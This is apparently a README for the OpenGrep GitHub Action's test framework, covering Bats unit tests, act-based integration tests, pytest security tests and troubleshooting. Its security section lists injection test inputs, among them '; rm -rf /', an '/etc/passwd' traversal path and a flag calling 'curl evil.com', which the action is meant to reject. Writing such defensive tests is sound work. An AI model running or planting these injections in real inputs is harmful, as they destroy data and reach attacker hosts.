# OpenGrep Action Testing Framework

This directory contains the streamlined testing framework for the OpenGrep GitHub Action, which separates unit, integration, and security testing for better maintainability and faster execution.

## Testing Architecture

### Unit Testing (`unit/`)
- **Purpose**: Tests shared shell validators without Docker or network access
- **Technology**: Bats
- **Scope**:
  - Path validation
  - Include/exclude pattern validation
  - Numeric, boolean, enum, version, and checksum validation

### 🔧 Integration Testing (`test-runner.sh`)
- **Purpose**: Tests GitHub Actions functionality and end-to-end workflows
- **Technology**: Bash script using `act` (local GitHub Actions runner)
- **Scope**: 
  - Basic scanning functionality
  - Output format validation (JSON, SARIF, text)
  - Advanced configuration options
  - Strict mode behavior
  - Differential scans with `baseline-commit`
  - Error handling and validation
  - Performance testing

### 🔒 Security Testing (`security/`)
- **Purpose**: Comprehensive security vulnerability testing
- **Technology**: Python with pytest framework
- **Scope**:
  - Input validation testing
  - Injection vulnerability detection
  - Property-based fuzzing
  - Security boundary testing
  - Encoding bypass attempts

## Quick Start

### Run All Tests
```bash
just test-all              # Integration and security tests
```

### Unit Tests Only
```bash
just test-unit             # Validator unit tests
```

### Integration Tests Only
```bash
just test                  # All integration tests
just test-basic           # Basic functionality
just test-formats         # Output format validation
just test-advanced        # Advanced options
just test-errors          # Error handling
```

### Security Tests Only
```bash
just test-security        # Full security test suite
just test-security-quick  # Essential security tests only
```

### Fast Development Testing
```bash
just test-fast            # Quick integration + security tests
```

## Quick Start

### 1. Run All Tests (Recommended)
```bash
# Make test runner executable
chmod +x test-runner.sh

# Run complete test suite
./test-runner.sh
```

This will:
- Check all prerequisites
- Setup test environment  
- Run all test scenarios
- Clean up afterward

### 2. Run Specific Tests
```bash
# Run only basic functionality tests
./test-runner.sh test test-basic-scan

# Run format validation tests
./test-runner.sh test test-single-formats

# Run security tests
just test-security
```

### 3. Manual Act Commands
```bash
# Run specific job with act directly
act -W .github/workflows/test-opengrep-action.yml -j test-basic-scan

# Run with verbose output
act -W .github/workflows/test-opengrep-action.yml -j test-basic-scan --verbose

# Run all jobs in workflow
act -W .github/workflows/test-opengrep-action.yml
```

## Test Scenarios

### Test 1: Basic Scan Functionality
**File:** `test-basic-scan` job  
**Purpose:** Verify core scanning works with default settings

**What it tests:**
- Action installs OpenGrep correctly
- Scans test files with vulnerabilities
- Produces JSON and SARIF outputs by default
- Returns valid findings count
- File outputs are valid JSON/SARIF

**Expected vulnerabilities in test data:**
- Command injection (`os.system()`)
- SQL injection (string concatenation)
- Path traversal (user-controlled file paths)

### Test 2: Single Format Outputs
**File:** `test-single-formats` job  
**Purpose:** Matrix test for each output format

**What it tests:**
- JSON format validation
- SARIF format validation  
- Text format creation
- Output file path correctness
- Format-specific output properties

### Test 3: Strict Mode
**File:** `test-strict-mode` job
**Purpose:** Verify strict mode fails when findings exist

**What it tests:**
- Findings are detected in vulnerable code
- Strict mode returns a failed action outcome
- The findings count remains available after failure

### Test 4: Advanced Options
**File:** `test-advanced-options` job  
**Purpose:** Test complex configurations

**What it tests:**
- Custom patterns/rules
- Severity filtering
- File inclusion/exclusion  
- Experimental features
- Additional safe flags
- Verbose output

### Test 5: Baseline Commit
**File:** `test-baseline-commit` runner case
**Purpose:** Verify differential scans against a previous Git commit

**What it tests:**
- Baseline commit refs are accepted and passed as `--baseline-commit`
- Existing findings in the baseline are suppressed
- JSON output is still produced for differential scans

### Test 6: Error Handling
**File:** `test-error-handling` job  
**Purpose:** Verify graceful failure handling

**What it tests:**
- Invalid target paths
- Command injection protection
- Invalid flag rejection
- Proper error messages
- Secure failure modes

### Test 7: Large File Handling
**File:** `test-large-files` job  
**Purpose:** Test performance with large inputs

**What it tests:**
- File size limit enforcement
- Timeout handling
- Memory management
- Large file skipping

## Troubleshooting

### Common Issues

**1. Docker Permission Denied**
```bash
# Add user to docker group
sudo usermod -aG docker $USER
# Log out and back in
```

**2. Act Not Found**
```bash
# Manual installation
curl -s https://api.github.com/repos/nektos/act/releases/latest | \
  grep "browser_download_url.*Linux_x86_64.tar.gz" | \
  cut -d : -f 2,3 | tr -d \" | \
  wget -qi - -O act.tar.gz
tar xf act.tar.gz
sudo mv act /usr/local/bin/
```

**3. Test Timeouts**
```bash
# Increase timeout in test-runner.sh
TEST_TIMEOUT=1200  # 20 minutes
```

**4. Docker Image Issues**
```bash
# Pull image manually
docker pull catthehacker/ubuntu:act-22.04

# Use different image
echo "-P ubuntu-latest=ubuntu:latest" > .actrc
```

**5. OpenGrep Installation Fails**
```bash
# Test manual installation
curl -fsSL https://raw.githubusercontent.com/opengrep/opengrep/main/install.sh | bash
opengrep --version
```

### Debug Mode
```bash
# Run with maximum verbosity
RUNNER_DEBUG=1 ./test-runner.sh test test-basic-scan

# Or with act directly
act -W .github/workflows/test-opengrep-action.yml \
    -j test-basic-scan \
    --verbose \
    --env RUNNER_DEBUG=1
```

### Log Analysis
```bash
# Check act logs
act -W .github/workflows/test-opengrep-action.yml \
    -j test-basic-scan 2>&1 | tee test.log

# Analyze specific step failures
grep -A 10 -B 10 "Error\|Failed\|Exception" test.log
```

## Security Testing

### Input Validation Tests
The test suite includes specific security validation:

```yaml
# These should all FAIL securely:
severity: 'INVALID'           # Invalid enum
exclude: '; rm -rf /'         # Command injection
target: '../../../etc/passwd' # Path traversal
additional-safe-flags: '--malicious-flag; curl evil.com'  # Invalid flag
```

### Expected Security Behavior
- Action fails fast with clear error messages
- No command execution from malicious inputs
- Path traversal attempts blocked
- Only allowlisted flags accepted
- All inputs validated before use

## CI/CD Integration

### GitHub Actions Testing
```yaml
# .github/workflows/test-action.yml
name: Test Action
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
      - name: Test Action
        run: ./test-runner.sh
```

## Adding New Tests

### 1. Create Test Job
Add new job to `.github/workflows/test-opengrep-action.yml`:

```yaml
test-my-feature:
  name: Test My Feature
  runs-on: ubuntu-latest
  steps:
    - name: Checkout
      uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
    
    - name: Test My Feature
      uses: ./
      with:
        target: 'test-data/'
        my-new-option: 'true'
      id: my-test
    
    - name: Verify Results
      run: |
        echo "Testing my feature..."
        # Add validation logic
```

### 2. Add Test Data
```bash
# Create test files in tests/data/
mkdir -p tests/data/my-feature
echo "test content" > tests/data/my-feature/test.py
```

### 3. Update Test Runner
Add test name to `run_all_tests()` function in `test-runner.sh`:

```bash
local tests=(
    "test-basic-scan"
    "test-single-formats"
    # ... existing tests
    "test-my-feature"  # Add here
)
```

### 4. Test Your Changes
```bash
./test-runner.sh test test-my-feature
```
